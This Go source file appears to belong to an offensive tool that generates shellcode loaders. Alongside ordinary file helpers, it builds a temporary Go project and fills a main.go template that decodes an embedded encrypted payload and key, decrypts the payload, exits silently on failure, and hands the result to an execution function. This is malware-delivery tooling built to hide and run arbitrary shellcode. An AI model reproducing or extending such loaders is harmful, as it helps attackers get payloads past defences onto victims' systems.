package tools

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"os"
)

func WriteToFile(outfile string, filname string, toWrite string) error {

	full_path := fmt.Sprintf("%s/%s", outfile, filname)
	file, err := os.OpenFile(full_path, os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}

	file.WriteString(toWrite)
	file.Close()
	return nil
}

func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func ReadFile(filepath string) ([]byte, error) {
	buf := bytes.NewBuffer(nil)
	f, err := os.Open(filepath)
	if err != nil {
		return []byte{}, err
	}

	io.Copy(buf, f)
	f.Close()

	return buf.Bytes(), nil
}

func DirExists(dir string) (bool, error) {
	_, err := os.Stat(dir)
	if err == nil {
		return true, nil
	}

	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func CreateTmpProjectRoot(path string) error {

	/*
	   create a directory with the path name
	   defined by the options
	*/

	exists, err := DirExists(path)
	if err != nil {
		return err
	}

	if exists {
		os.RemoveAll(path)
	}

	err = os.MkdirAll(path, 0777)
	if err != nil {
		return err
	}

	var go_mod = []byte(`
module github.com/cmepw/myph

go 1.20

    `)

	gomod_path := fmt.Sprintf("%s/go.mod", path)
	fo, err := os.Create(gomod_path)
	fo.Write(go_mod)

	fmt.Println("[+] Project root created....")

	maingo_path := fmt.Sprintf("%s/main.go", path)
	_, _ = os.Create(maingo_path)

	execgo_path := fmt.Sprintf("%s/exec.go", path)
	_, _ = os.Create(execgo_path)

	encryptgo_path := fmt.Sprintf("%s/encrypt.go", path)
	_, _ = os.Create(encryptgo_path)

	return nil
}

func GetMainTemplate(encoding string, key string, sc string) string {
	return fmt.Sprintf(`
package main

import (
    "os"
    enc "encoding/%s"
)

var Key = %s
var Code = %s

func main() {

    decodedSc, _ := enc.StdEncoding.DecodeString(Code)
    decodedKey, _ := enc.StdEncoding.DecodeString(Key)

    decrypted, err := Decrypt(decodedSc, decodedKey)
    if err != nil {
        os.Exit(1)
    }

    ExecuteOrderSixtySix(decrypted)
}
    `, encoding, key, sc)
}